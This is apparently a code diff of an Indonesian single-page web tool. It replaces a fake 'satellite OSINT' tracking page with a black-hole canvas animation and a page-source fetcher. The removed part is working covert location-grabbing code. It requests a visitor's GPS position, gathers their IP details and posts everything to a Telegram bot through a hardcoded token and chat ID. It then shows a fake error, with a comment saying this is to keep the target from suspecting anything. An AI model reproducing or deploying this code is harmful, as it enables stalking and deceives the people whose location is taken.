+                        const stretchY = (blackHole.y - sy) * this.suckProgress * 0.4;
+                        sx += stretchX;
+                        sy += stretchY;
+                    }
+
+                    ctx.shadowColor = star.color;
+                    ctx.shadowBlur = 8 + Math.sin(time * 0.005) * 4;
+                    ctx.fillStyle = star.color;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, star.size, 0, Math.PI * 2);
+                    ctx.fill();
+
+                    ctx.fillStyle = '#ffffff';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, star.size * 0.45, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+
+                ctx.restore();
+                ctx.shadowBlur = 0;
+            }
+
+            drawThrusters(ox, oy) {
+                if (Math.random() > 0.3) {
+                    this.thrusters.push({
+                        x: ox - 35 * this.scale,
+                        y: oy + (Math.random() - 0.5) * 45,
+                        vx: -Math.random() * 3 - 2,
+                        vy: (Math.random() - 0.5) * 1.2,
+                        life: 1.0,
+                        size: Math.random() * 3 + 1.5
+                    });
+                }
+
+                this.thrusters.forEach((p, index) => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    p.life -= 0.04;
+
+                    if (p.life <= 0) {
+                        this.thrusters.splice(index, 1);
+                        return;
+                    }
+
+                    ctx.fillStyle = `rgba(0, 180, 255, ${p.life})`;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.size * p.life, 0, Math.PI * 2);
+                    ctx.fill();
+                });
+            }
+
+            triggerSuck() {
+                this.isSucked = true;
+                this.suckProgress = 0;
+            }
+        }
+
+        class Scorpius {
+            constructor() {
+                this.updateCoordinates();
+                this.isSucked = false;
+                this.suckProgress = 0;
+                this.opacity = 1.0;
+            }
+
+            updateCoordinates() {
+                this.x = canvas.width * 0.20;
+                this.baseY = canvas.height * 0.84; 
+                if (canvas.width < 768) {
+                    this.x = canvas.width * 0.18;
+                    this.baseY = canvas.height * 0.80;
+                }
+                this.y = this.baseY;
+                this.scale = canvas.width < 768 ? 0.55 : 0.85;
+
+                this.nodes = {
+                    graffias:  { rx: -25 * this.scale, ry: -35 * this.scale, size: 3.5, color: '#ff44aa' },
+                    dschubba:  { rx: -10 * this.scale, ry: -45 * this.scale, size: 4,   color: '#ff44aa' },
+                    jabbah:    { rx: 12 * this.scale,  ry: -40 * this.scale, size: 3.2, color: '#ff44aa' },
+                    antares:   { rx: 0,                ry: -10 * this.scale, size: 6.8, color: '#ff3300' }, 
+                    alniyat:   { rx: 10 * this.scale,  ry: 5 * this.scale,   size: 3,   color: '#ffaa66' },
+                    larawag:   { rx: 6 * this.scale,   ry: 20 * this.scale,  size: 3.4, color: '#ffffff' },
+                    sargas:    { rx: -8 * this.scale,  ry: 35 * this.scale,  size: 3.8, color: '#ff88aa' },
+                    shaula:    { rx: -20 * this.scale, ry: 50 * this.scale,  size: 4,   color: '#00ffaa' },
+                    lesath:    { rx: -12 * this.scale, ry: 65 * this.scale,  size: 4.5, color: '#00f0ff' }
+                };
+            }
+
+            draw() {
+                if (this.opacity <= 0.01) return;
+
+                const time = Date.now();
+                let sx = this.x;
+                let sy = this.y;
+
+                if (this.isSucked) {
+                    this.suckProgress += 0.018;
+                    if (this.suckProgress > 1.0) this.suckProgress = 1.0;
+
+                    this.opacity = 1.0 - this.suckProgress;
+
+                    const dx = blackHole.x - this.x;
+                    const dy = blackHole.y - this.y;
+                    const angle = Math.atan2(dy, dx) + this.suckProgress * Math.PI * 3.5;
+                    const distance = Math.sqrt(dx * dx + dy * dy) * (1.0 - this.suckProgress);
+
+                    sx = blackHole.x - Math.cos(angle) * distance;
+                    sy = blackHole.y - Math.sin(angle) * distance;
+                } else {
+                    this.y = this.baseY + Math.sin(time * 0.0015 + 1.5) * 12;
+                    const trem = isGlobalSucking ? 4.5 : 1.0;
+                    sx = this.x + (Math.random() - 0.5) * trem;
+                    sy = this.y + (Math.random() - 0.5) * trem;
+                }
+
+                ctx.save();
+                ctx.globalAlpha = this.opacity;
+
+                ctx.strokeStyle = isGlobalSucking ? 'rgba(255, 0, 119, 0.25)' : 'rgba(255, 80, 80, 0.2)';
+                ctx.lineWidth = 1.4;
+                ctx.shadowColor = isGlobalSucking ? '#ff0077' : '#ff44aa';
+                ctx.shadowBlur = 5;
+                ctx.beginPath();
+
+                const n = this.nodes;
+                const drawLine = (p1, p2) => {
+                    let s1x = sx + p1.rx;
+                    let s1y = sy + p1.ry;
+                    let s2x = sx + p2.rx;
+                    let s2y = sy + p2.ry;
+
+                    if (this.isSucked) {
+                        const biasX = (blackHole.x - s1x) * this.suckProgress * 0.35;
+                        const biasY = (blackHole.y - s1y) * this.suckProgress * 0.35;
+                        s1x += biasX; s1y += biasY;
+                        s2x += biasX; s2y += biasY;
+                    }
+
+                    ctx.moveTo(s1x, s1y);
+                    ctx.lineTo(s2x, s2y);
+                };
+
+                drawLine(n.graffias, n.dschubba);
+                drawLine(n.dschubba, n.jabbah);
+                drawLine(n.jabbah, n.antares);
+                drawLine(n.antares, n.alniyat);
+                drawLine(n.alniyat, n.larawag);
+                drawLine(n.larawag, n.sargas);
+                drawLine(n.sargas, n.shaula);
+                drawLine(n.shaula, n.lesath);
+                ctx.stroke();
+                ctx.shadowBlur = 0;
+
+                for (let key in this.nodes) {
+                    const star = this.nodes[key];
+                    let starX = sx + star.rx;
+                    let starY = sy + star.ry;
+
+                    if (this.isSucked) {
+                        const stretchX = (blackHole.x - starX) * this.suckProgress * 0.4;
+                        const stretchY = (blackHole.y - starY) * this.suckProgress * 0.4;
+                        starX += stretchX;
+                        starY += stretchY;
+                    }
+
+                    ctx.shadowColor = star.color;
+                    ctx.shadowBlur = 8 + Math.sin(time * 0.005) * 4;
+                    ctx.fillStyle = star.color;
+                    ctx.beginPath();
+                    ctx.arc(starX, starY, star.size, 0, Math.PI * 2);
+                    ctx.fill();
+
+                    ctx.fillStyle = '#ffffff';
+                    ctx.beginPath();
+                    ctx.arc(starX, starY, star.size * 0.45, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+
+                ctx.restore();
+                ctx.shadowBlur = 0;
+            }
+
+            triggerSuck() {
+                this.isSucked = true;
+                this.suckProgress = 0;
+            }
+        }
+
+        /* === Letusan Partikel HTML dengan Fisika Tarikan Black Hole Magnetis === */
+        function generateCodeParticle() {
+            const tags = ['<html>', '<div>', '<p>', 'CSS', 'JS', '<span>', '<h1>', 'src', 'href', 'class', 'id', '<a>'];
+            const chosen = tags[Math.floor(Math.random() * tags.length)];
+
+            const card = document.getElementById('inputCard');
+            const rect = card.getBoundingClientRect();
+            const startX = rect.left + rect.width / 2;
+            const startY = rect.top + rect.height / 2;
+
+            // Menghitung vektor arah dasar dari kartu ke Black Hole
+            const dx = blackHole.x - startX;
+            const dy = blackHole.y - startY;
+            const baseAngle = Math.atan2(dy, dx);
+
+            // Menambahkan efek sebaran acak lebar (erupsi awal)
+            const angle = baseAngle + (Math.random() - 0.5) * 1.5; 
+            const speed = Math.random() * 8 + 4; // Semburan awal yang cepat
+
+            codeParticles.push({
+                x: startX + (Math.random() - 0.5) * 50,
+                y: startY + rect.height / 3,
+                text: chosen,
+                color: Math.random() > 0.5 ? '#ff00aa' : '#00f0ff',
+                fontSize: Math.floor(Math.random() * 5) + 11,
+                opacity: 1,
+                vx: Math.cos(angle) * speed,
+                vy: Math.sin(angle) * speed
             });
         }
-    }
-</script>
-</body>
-</html>
 
-<div class="card">
-    <h2>XYZ TRACKING</h2>
-    <div class="sub">SATELLITE OSINT V2.0</div>
-    
-    <div class="radar"></div>
+        function runMainLoop() {
+            ctx.fillStyle = 'rgba(2, 1, 6, 0.22)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-    <input type="text" id="phone" placeholder="TARGET PHONE/NAME">
-    <button onclick="locateTarget()">INITIATE TRACKING</button>
-    
-    <div id="status">Awaiting Signal...</div>
-</div>
+            stars.forEach(star => {
+                star.twinkle += star.speed;
+                const liveOpacity = star.opacity + Math.sin(star.twinkle) * 0.25;
 
-<script>
-    // --- KONFIGURASI API LAMA + ID BARU ---
-    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
-    const CHAT_ID = "7496062352"; 
-    // -------------------------------------
+                const dx = star.x - blackHole.x;
+                const dy = star.y - blackHole.y;
+                const dist = Math.sqrt(dx * dx + dy * dy);
 
-    function tellTele(txt) {
-        const ping = new Image();
-        ping.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=html&v=${Date.now()}`;
-    }
+                let rx = star.x;
+                let ry = star.y;
 
-    async function report(lat, lon, acc, target) {
-        document.getElementById('status').innerText = "SIGNAL CAPTURED. UPLINKING...";
-        
-        let ipInfo = "Hidden/VPN";
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            ipInfo = `${d.ip} (${d.org})`;
-        } catch(e) {}
+                if (dist < 340 && dist > blackHole.eventHorizon) {
+                    const shear = (340 - dist) * 0.16;
+                    const angle = Math.atan2(dy, dx);
+                    rx += Math.cos(angle + 0.12) * shear;
+                    ry += Math.sin(angle + 0.12) * shear;
+                }
 
-        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        const reportText = `🛰️ <b>XYZ TRACKING - TARGET LOCKED!</b>\n\n` +
-                           `👤 <b>Target:</b> ${target}\n` +
-                           `📍 <b>Lat:</b> <code>${lat}</code>\n` +
-                           `📍 <b>Lon:</b> <code>${lon}</code>\n` +
-                           `🎯 <b>Accuracy:</b> ${acc}m\n` +
-                           `🌐 <b>IP/Net:</b> ${ipInfo}\n\n` +
-                           `🌍 <b>Google Maps:</b>\n${mapLink}`;
+                ctx.fillStyle = `rgba(255, 255, 255, ${Math.max(0, Math.min(1, liveOpacity))})`;
+                ctx.beginPath();
+                ctx.arc(rx, ry, star.size, 0, Math.PI * 2);
+                ctx.fill();
+            });
 
-        tellTele(reportText);
-        
-        // Kasih efek sukses ke target biar ga curiga
-        setTimeout(() => {
-            alert("Connection error: Satellite signal too weak. Please try again later.");
-            document.getElementById('status').innerText = "UPLINK SUCCESSFUL.";
-        }, 1000);
-    }
+            blackHole.drawBack();
+            blackHole.drawSingularity();
+            blackHole.drawFront();
 
-    function locateTarget() {
-        const t = document.getElementById('phone').value;
-        if(!t) return alert("INPUT TARGET ID!");
+            orion.draw();
+            scorpius.draw();
 
-        document.getElementById('status').innerText = "REQUESTING GPS ACCESS...";
+            // Loop Partikel dengan kalkulasi tarikan vortex
+            codeParticles.forEach((tag, idx) => {
+                const dx = blackHole.x - tag.x;
+                const dy = blackHole.y - tag.y;
+                const dist = Math.sqrt(dx * dx + dy * dy);
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    report(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, t);
-                },
-                (err) => {
-                    document.getElementById('status').innerText = "ERROR: ACCESS DENIED.";
-                    tellTele(`⚠️ <b>TRACKING FAILED</b>\nTarget: ${t}\nReason: GPS Permission Denied.`);
-                    alert("Error: 0x882 - Satellite Access Denied. Please allow GPS to proceed.");
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            alert("Hardware not supported.");
+                // Jika sudah sangat dekat dengan singularity / event horizon, hapus partikel
+                if (dist < blackHole.eventHorizon + 8) {
+                    codeParticles.splice(idx, 1);
+                    return;
+                }
+
+                // GAYA TARIK AKTIF (Meningkat seiring mendekatnya jarak ke Black Hole)
+                const pullForce = 0.24 + (120 / dist); 
+                tag.vx += (dx / dist) * pullForce;
+                tag.vy += (dy / dist) * pullForce;
+
+                // GAYA SPIN/VORTEX (Menciptakan putaran spiral di sekitar Black Hole)
+                const swirlStrength = Math.min(3.5, 220 / dist);
+                const perpX = -dy / dist;
+                const perpY = dx / dist;
+                tag.vx += perpX * swirlStrength;
+                tag.vy += perpY * swirlStrength;
+
+                // Hambatan udara luar angkasa agar gerakan tetap mulus & tidak overshooting tajam
+                tag.vx *= 0.93;
+                tag.vy *= 0.93;
+
+                tag.x += tag.vx;
+                tag.y += tag.vy;
+
+                // Memudarkan partikel secara proporsional saat masuk ke lubang hitam
+                tag.opacity = Math.max(0, Math.min(1, dist / 180));
+
+                ctx.font = `600 ${tag.fontSize}px 'Fira Code'`;
+                ctx.fillStyle = tag.color === '#00f0ff' ? `rgba(0, 240, 255, ${tag.opacity})` : `rgba(255, 0, 119, ${tag.opacity})`;
+                ctx.fillText(tag.text, tag.x, tag.y);
+            });
+
+            requestAnimationFrame(runMainLoop);
         }
-    }
-</script>
 
+        window.addEventListener('resize', () => {
+            resizeCanvas();
+            if (blackHole) blackHole.updateCoordinates();
+            if (orion) orion.updateCoordinates();
+            if (scorpius) scorpius.updateCoordinates();
+        });
+
+        window.onload = function() {
+            resizeCanvas();
+            runMainLoop();
+        };
+
+        /* === HTML Code Sucker & Terminal Operations === */
+        async function generateCode() {
+            const urlInput = document.getElementById('urlInput');
+            const url = urlInput.value.trim();
+            
+            if (!url) {
+                showToast('Masukkan target URL terlebih dahulu!', 'error');
+                return;
+            }
+            
+            if (!url.startsWith('https://')) {
+                showToast('URL wajib menggunakan https:// aman.', 'error');
+                return;
+            }
+            
+            const loader = document.getElementById('loaderBox');
+            const loaderText = document.getElementById('loaderText');
+            
+            loader.classList.add('active');
+            isGlobalSucking = true;
+
+            const particleInterval = setInterval(() => {
+                generateCodeParticle();
+                generateCodeParticle();
+                generateCodeParticle();
+            }, 40);
+
+            const statusStates = [
+                'Menyeimbangkan distorsi gravitasi Black Hole...',
+                'Membuka kanal jembatan kuantum ke server...',
+                'Menghisap partikel markup HTML dari galaksi...',
+                'Mempersiapkan penyerapan rasi bintang penahan...'
+            ];
+            
+            let currentStatus = 0;
+            const messageInterval = setInterval(() => {
+                if (currentStatus < statusStates.length - 1) {
+                    currentStatus++;
+                    loaderText.textContent = statusStates[currentStatus];
+                }
+            }, 600);
+            
+            try {
+                const response = await fetch(`https://api.resellergaming.my.id/tools/getcode?url=${encodeURIComponent(url)}`);
+                const data = await response.json();
+                
+                setTimeout(() => {
+                    clearInterval(particleInterval);
+                    clearInterval(messageInterval);
+
+                    if (data.status) {
+                        orion.triggerSuck();
+                        scorpius.triggerSuck();
+
+                        setTimeout(() => {
+                            loader.classList.remove('active');
+                            isGlobalSucking = false;
+
+                            document.getElementById('inputCard').classList.add('hidden');
+                            
+                            const rawCode = data.result.html || '<!-- Berhasil dihisap tapi tidak bermuatan -->';
+                            document.getElementById('codeOutput').innerHTML = applySyntaxColoring(rawCode);
+                            
+                            document.getElementById('terminalOverlay').classList.add('visible');
+                            showToast('Scorpius dan Orion berhasil dihisap Black Hole!', 'success');
+                        }, 1500);
+
+                    } else {
+                        throw new Error('Distorsi data.');
+                    }
+                }, 2000);
+
+            } catch (error) {
+                clearInterval(particleInterval);
+                clearInterval(messageInterval);
+                loader.classList.remove('active');
+                isGlobalSucking = false;
+                showToast('Target gagal dihisap! Medan pertahanan luar menolak ekstraksi.', 'error');
+                console.error(error);
+            }
+        }
+
+        /* === Syntax Highlighter === */
+        function applySyntaxColoring(raw) {
+            let escaped = raw
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;");
+            
+            return escaped.replace(/&lt;(\/?[a-zA-Z0-9:-]+)([\s\S]*?)&gt;/g, function(match, tagName, tagBody) {
+                let highlightedTagName = `&lt;<span class="tag">${tagName}</span>`;
+                let highlightedBody = tagBody.replace(/(\s[a-zA-Z0-9:-]+)=("[^"]*"|'[^']*')/g, function(attrMatch, attrName, attrVal) {
+                    return ` <span class="attr">${attrName.trim()}</span>=<span class="val">${attrVal}</span>`;
+                });
+                return highlightedTagName + highlightedBody + '&gt;';
+            });
+        }
+
+        // Reset application to initial state
+        function resetApp() {
+            document.getElementById('terminalOverlay').classList.remove('visible');
+            document.getElementById('inputCard').classList.remove('hidden');
+            
+            document.getElementById('urlInput').value = '';
+            document.getElementById('loaderText').textContent = 'Menyelaraskan gravitasi Black Hole...';
+
+            orion.isSucked = false;
+            orion.suckProgress = 0;
+            orion.opacity = 1.0;
+            orion.updateCoordinates();
+
+            scorpius.isSucked = false;
+            scorpius.suckProgress = 0;
+            scorpius.opacity = 1.0;
+            scorpius.updateCoordinates();
+
+            showToast('Sistem dikalibrasi ulang. Siap menghisap target baru!', 'success');
+        }
+
+        // Secure copy to clipboard with iframe/sandbox safety features
+        function copyCode() {
+            const codeOutput = document.getElementById('codeOutput');
+            const copyBtn = document.getElementById('copyBtn');
+            const codeText = codeOutput.textContent || codeOutput.innerText;
+
+            if (!codeText) {
+                showToast('Materi kosong! Tidak ada kode untuk disalin.', 'error');
+                return;
+            }
+
+            let copiedSuccessfully = false;
+            try {
+                const helperArea = document.createElement('textarea');
+                helperArea.value = codeText;
+                helperArea.style.position = 'fixed';
+                helperArea.style.left = '-9999px';
+                document.body.appendChild(helperArea);
+                helperArea.select();
+                copiedSuccessfully = document.execCommand('copy');
+                document.body.removeChild(helperArea);
+            } catch (err) {
+                copiedSuccessfully = false;
+            }
+
+            if (!copiedSuccessfully && navigator.clipboard) {
+                navigator.clipboard.writeText(codeText).then(() => {
+                    handleCopyTrigger(copyBtn);
+                }).catch(() => {
+                    showToast('Gagal menyalin. Blokade izin clipboard terdeteksi.', 'error');
+                });
+            } else if (copiedSuccessfully) {
+                handleCopyTrigger(copyBtn);
+            } else {
+                showToast('Gagal menyalin kode.', 'error');
+            }
+        }
+
+        function handleCopyTrigger(btn) {
+            btn.innerHTML = `
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                </svg>
+                Kode Tersalin!
+            `;
+            btn.classList.add('copied');
+            showToast('Kode berhasil dimasukkan ke clipboard Anda!', 'success');
+            
+            setTimeout(() => {
+                btn.innerHTML = `
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0-2-.9-2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
+                    </svg>
+                    Salin Kode
+                `;
+                btn.classList.remove('copied');
+            }, 2000);
+        }
+    </script>
 </body>
-</html>
+                        </html>
